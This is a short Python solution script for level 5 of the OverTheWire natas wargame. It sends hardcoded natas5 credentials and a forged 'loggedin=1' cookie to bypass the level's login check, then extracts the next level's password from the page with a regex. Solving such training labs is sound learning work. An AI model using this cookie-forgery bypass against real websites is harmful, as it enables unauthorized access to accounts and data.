import requests
import re

username = 'natas5'
password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'

url = 'http://%s.natas.labs.overthewire.org'%username

cookies = { 'loggedin' : '1'}

response = requests.get(url,auth=(username,password) , cookies=cookies)
content = response.text

# print(content)
hashvalue = re.findall("The password for natas6 is (.*)</div>",content)[0]
print(hashvalue)